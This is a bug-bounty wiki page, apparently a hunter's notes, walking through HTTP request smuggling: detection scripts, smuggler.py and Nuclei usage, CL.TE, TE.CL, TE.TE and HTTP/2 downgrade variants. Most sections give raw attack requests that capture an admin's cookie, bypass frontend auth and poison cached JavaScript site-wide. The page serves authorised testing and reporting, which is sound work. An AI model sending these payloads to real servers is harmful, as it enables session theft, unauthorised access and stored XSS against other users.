---
type: wiki
category: attack
tool: burp,smuggler
status: active
last-updated: 2026-04-21
---

# HTTP Request Smuggling Walkthrough

> **Use case:** Most modern websites have a frontend (CDN/LB/WAF) → backend architecture. If the two sides disagree on Content-Length / Transfer-Encoding parsing, you can smuggle.
> A high-frequency, high-payout PortSwigger / HackerOne category — P1-P2 findings are common (cache poisoning / auth bypass / stealing admin requests).

## 0. Core principle

HTTP/1.1 uses two ways to determine request body length:

```
Content-Length: 12     ← normal (CL)
Transfer-Encoding: chunked  ← chunked (TE)
```

If the frontend uses CL and the backend uses TE (or vice versa), an attacker can hide a second request inside one request, and the backend treats the hidden part as "the start of the next user's request."

### Four basic variants

| Variant | Frontend | Backend | Common scenario |
|------|------|------|---------|
| **CL.TE** | CL | TE | AWS ALB + backend that supports TE |
| **TE.CL** | TE | CL | nginx + Apache Tomcat |
| **TE.TE** | TE (obfuscated) | TE | Via obfuscation (`Transfer-Encoding: xchunked`) |
| **H2.CL / H2.TE** | HTTP/2 | HTTP/1.1 (with CL/TE directives) | Cloudflare / Akamai HTTP/2 frontends |

## 1. Detection (timing-difference method)

### Manual (curl + python)

```python
# CL.TE detection — if the backend reads TE, it will hang waiting for the next chunk and time out
import socket
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "1\r\n"
    "A\r\n"
    "X"    # deliberately write an extra X — if the backend reads CL=4 it stops after reading, if it reads TE it hangs waiting for the chunk terminator
)
s = socket.create_connection(("target.com", 443))
s.sendall(payload.encode())
```

If the frontend timeout < the backend timeout: the backend hangs → a long delay → smuggling may exist.

### Automated: smuggler.py

```bash
# https://github.com/defparam/smuggler
git clone https://github.com/defparam/smuggler
cd smuggler

# Basic scan
python3 smuggler.py -u https://target.com --test all

# Only test CL.TE
python3 smuggler.py -u https://target.com --test basic

# Custom request file
python3 smuggler.py -u https://target.com -r request.txt
```

### Automated: Burp HTTP Request Smuggler (JS, ActiveScan++)

Burp Store → install "HTTP Request Smuggler" → right-click target → `Smuggle probe` → check Issues.

### Nuclei (crude)

```bash
nuclei -u https://target.com -t http/vulnerabilities/generic/http-desync.yaml
# High false-positive rate, recommend verifying with smuggler.py
```

## 2. CL.TE Smuggling (frontend uses CL / backend uses TE)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Parsing:**
- Frontend reads `Content-Length: 13` → sends the entire body (13 bytes, containing `0\r\n\r\nSMUGGLED`) to the backend as one request
- Backend reads `Transfer-Encoding: chunked` → `0\r\n\r\n` = end of chunks → first request ends
- `SMUGGLED` stays in the socket buffer → becomes the **start of the next user's request**

### Real-world use: stealing an admin's request

```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 165
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X
```

When the next user (possibly an admin) sends a request, the backend appends their request line **right after our `X-Ignore: X`**, turning it into:

```
GET /admin HTTP/1.1
Host: target.com
X-Ignore: XGET / HTTP/1.1   ← the admin's real request gets stuffed in here
Cookie: session=ADMIN_TOKEN
...
```

→ our request gets routed to `/admin` with the admin's cookie attached → the admin page is returned to us.

## 3. TE.CL Smuggling (the reverse)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

- Frontend TE → reads `8\r\nSMUGGLED\r\n0\r\n\r\n` (complete chunks) → treats it all as one request
- Backend CL=3 → only reads `8\r\n` (3 bytes) → the rest (`SMUGGLED\r\n0\r\n\r\n`) stays in the buffer → goes to the next user

## 4. TE.TE (obfuscation)

The frontend doesn't recognize an abnormal TE header, but the backend does → one side uses CL, the other uses TE.

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
  Transfer-Encoding: chunked
Transfer-Encoding: chunked\x20
Transfer-Encoding:[tab]chunked
X-Transfer-Encoding: chunked
Transfer-Encoding: chunked\r\nX: X
Transfer-Encoding:\n chunked
```

smuggler.py's `--test all` automatically tries 40+ obfuscation variants.

## 5. HTTP/2 Downgrade (the modern mainstream)

HTTP/2 doesn't use CL/TE — it uses binary frames. But many CDNs/LBs **downgrade** HTTP/2 to HTTP/1.1 for the backend. An attacker can sneak a CL/TE header into HTTP/2, and it becomes effective after the downgrade.

### H2.CL

```
# HTTP/2 request (using curl --http2-prior-knowledge or nghttp2)
:method POST
:path /
:authority target.com
content-length 0    ← note: in HTTP/2 content-length is just a header, but the pseudo-header/frame length is the real body boundary

GET /admin HTTP/1.1
Host: target.com
```

The frontend HTTP/2 doesn't look at content-length (because HTTP/2 uses frame length) → the whole body is sent.
When downgraded, `content-length: 0` gets written into the HTTP/1.1 header → the backend reads CL=0, so the following `GET /admin` becomes a new request.

### H2.TE

```
:method POST
:path /
:authority target.com
transfer-encoding chunked

0

GET /admin HTTP/1.1
```

### Tools

- **Burp HTTP/2 message view** (Options → HTTP → "Allow HTTP/2 ALPN override")
- **smuggler.py with --http2**
- **h2csmuggler**: https://github.com/BishopFox/h2csmuggler

## 6. Real-world attack chains

### 6.1 Capture admin request → Steal cookie

```http
POST /abc HTTP/1.1
Host: target.com
Content-Length: 400
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```

The next user's request gets stuffed after `data=` → the server writes the whole thing to `/log` (possibly a comment function, profile, etc. that the attacker can read) → their cookie is exposed.

### 6.2 Bypass frontend security (X-Forwarded-For / auth)

The frontend decides auth based on URL, but the backend receives the smuggled `/admin` → bypass.

```http
POST /api/public HTTP/1.1
Host: target.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /api/admin/users HTTP/1.1
X-Foo: x
```

### 6.3 Cache Poisoning (very powerful)

Write the smuggled request's response into the cache entry for "the next victim's request path."

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /js/app.js HTTP/1.1
Host: target.com
User-Agent: attacker
X-Bypass: 1
```

The backend responds with `/js/app.js`'s response → the frontend cache pastes it onto the victim's `/js/app.js` → every user's JS gets replaced → site-wide XSS.

## 7. Safe testing rules

1. ✅ **Use the timing-difference method for detection first** (non-destructive)
2. ✅ **Use your own session cookie to test smuggled requests** (doesn't affect others)
3. ❌ **Don't test during high-traffic hours** (a victim's request path could get altered)
4. ❌ **Don't cause stored impact** (e.g. poisoning cache with site-wide js)
5. ✅ **Close the connection immediately after testing** (avoid a leftover buffer affecting the pool)

## 8. Full PoC workflow (Burp)

### Step 1: Detection
```
1. Proxy a normal request to target
2. Extensions → HTTP Request Smuggler → Launch smuggle probe
3. Wait for scan → Issues tab shows "Possible smuggling"
```

### Step 2: Verification (Turbo Intruder)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )
    # deliberately smuggle
    smuggle = '''POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: X'''
    engine.queue(smuggle)
    # immediately send a normal request → check if it was affected by the smuggle
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### Step 3: Reporting

Include:
- The exact CL/TE variant
- The full raw HTTP request
- Timing-difference proof (delay timing)
- Verification PoC (using your own account to demonstrate admin route access or request capture)
- Remediation suggestion (frontend/backend synchronize HTTP parser)

## 9. Nuclei quick-triage template

```yaml
id: http-smuggle-desync-test
info:
  name: HTTP Smuggling Time-based Detect
  severity: info
  author: hunter

http:
  - raw:
      - |+
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 4
        Transfer-Encoding: chunked

        1
        A
        X

    unsafe: true
    read-all: false
    matchers:
      - type: dsl
        dsl:
          - "duration >= 10"
```

## 10. Report template

```markdown
## Vulnerability Summary
https://target.com's CDN (Cloudflare) and backend (Spring Boot) disagree on how they parse
Transfer-Encoding, allowing CL.TE smuggling to steal the next user's session cookie.

## Detection
smuggler.py -u https://target.com --test basic
→ CL.TE Vulnerable

## PoC
[raw HTTP request]

Delay verification:
time { curl ... }
→ normal: 150ms / smuggle: 30s

## Impact
- Can steal any user's session cookie
- Can cache-poison /js/app.js → site-wide stored XSS

## Severity
P1 / Critical
```

## Related files

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md) — attack surface behind a WAF
- [64-cache-poisoning.md](64-cache-poisoning.md) — one of smuggling's common impacts
- PortSwigger HTTP Desync Lab: https://portswigger.net/web-security/request-smuggling
- smuggler.py: https://github.com/defparam/smuggler
- h2csmuggler: https://github.com/BishopFox/h2csmuggler
